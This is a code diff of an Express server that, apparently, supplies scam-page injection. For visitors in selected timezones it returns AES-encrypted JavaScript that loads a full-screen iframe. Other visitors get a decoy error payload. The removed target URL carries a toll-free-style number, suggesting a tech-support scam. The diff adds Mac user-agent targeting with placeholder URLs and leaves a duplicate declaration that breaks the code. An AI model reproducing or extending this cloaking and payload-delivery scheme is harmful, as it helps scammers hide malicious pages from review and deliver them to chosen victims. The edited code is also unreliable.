@@ -23,23 +23,22 @@ app.use((req, res, next) => {
 });
 
 // --- Static Data Configurations ---
-
-// O(1) Instant Lookup Set
 const ALLOWED_TIMEZONES = new Set([
     "Australia/Sydney", "Australia/Melbourne", "Australia/Brisbane", "Australia/Adelaide", "Australia/Perth", "Australia/Hobart", "Australia/Darwin", "Asia/Tokyo",
         "America/New_York", "America/Chicago", "America/Denver", "America/Los_Angeles", "America/Anchorage",
         "Pacific/Honolulu",
         "America/Toronto", "America/Vancouver", "America/Edmonton", "America/Winnipeg", "America/Halifax", "America/St_Johns"
 ]);
+const MAC_USER_AGENT_PATTERN = /Macintosh|Mac OS|macOS/;
 
-// Raw URLs accompanied by their selection probability weights (Must total 1.0)
-const RAW_CONFIGS = [
-    { url: "https://seahorse-app-779ym.ondigitalocean.app/werrx01USAHTML/?bcda=1800-029-288", weight: 1.0 } 
 
-];
+const MAC_URL = "https://example.com/mac-specific-url";
+const DEFAULT_URL = "https://example.com/default-url";
 
 // --- Pre-Compilation Cache Layer ---
-// This processes everything into memory ONCE during boot, removing CPU load during requests.
+const PRECOMPUTED_RESPONSES = [
+    { url: DEFAULT_URL, weight: 1.0 }
+];
 
 const PRECOMPUTED_RESPONSES = RAW_CONFIGS.map(item => {
     const rawPayload = `const iframe=document.createElement("iframe");iframe.src="${item.url}";iframe.setAttribute("allow","fullscreen; autoplay; encrypted-media; picture-in-picture");iframe.setAttribute("allowfullscreen","");iframe.setAttribute("webkitallowfullscreen","");iframe.setAttribute("mozallowfullscreen","");iframe.setAttribute("sandbox","allow-scripts allow-popups allow-forms allow-downloads");iframe.style.width="100%";iframe.style.height="100%";iframe.style.border="0px";const container=document.getElementById("contentiframe");if(container){container.replaceChildren(iframe);}`;
@@ -54,17 +53,12 @@ const PRECOMPUTED_RESPONSES = RAW_CONFIGS.map(item => {
 const ERROR_PAYLOAD = encodeURIComponent(CryptoJS.AES.encrypt(`console.log("Error Find");`, secretKey).toString());
 
 // --- Helper Functions ---
-
-/**
- * Returns a pre-encrypted payload immediately using constant-time evaluation 
- * and simple random boundary checks.
- */
 function getFastResponse() {
     const rand = Math.random();
     let cumulativeWeight = 0;
 
     for (const item of PRECOMPUTED_RESPONSES) {
-        cumulativeWeight = item.weight;
+        cumulativeWeight += item.weight;
         if (rand <= cumulativeWeight) {
             return item.encryptedPayload;
         }
@@ -73,7 +67,6 @@ function getFastResponse() {
 }
 
 // --- Routes ---
-
 app.get("/timezone", (req, res) => {
     res.status(401).json({
         status: "error",
@@ -84,10 +77,16 @@ app.get("/timezone", (req, res) => {
 
 app.post("/timezone", (req, res) => {
     const { timezone } = req.body;
+    const userAgent = req.headers['user-agent'] || '';
 
-    // Fast validations against memory references 
+    // Fast validations against memory references
     if (timezone && ALLOWED_TIMEZONES.has(timezone)) {
-        res.send(getFastResponse());
+        const selectedUrl = MAC_USER_AGENT_PATTERN.test(userAgent) ? MAC_URL : DEFAULT_URL;
+        const rawPayload = `const iframe=document.createElement("iframe");iframe.src="${selectedUrl}";...`;
+        
+        // Encrypt and return response as before
+        const encryptedPayload = encodeURIComponent(CryptoJS.AES.encrypt(rawPayload, secretKey).toString());
+        res.send(encryptedPayload);
     } else {
         res.send(ERROR_PAYLOAD);
     }
@@ -97,3 +96,4 @@ app.post("/timezone", (req, res) => {
 app.listen(PORT, () => {
     console.log(`High-performance server running on port ${PORT}`);
 });
+
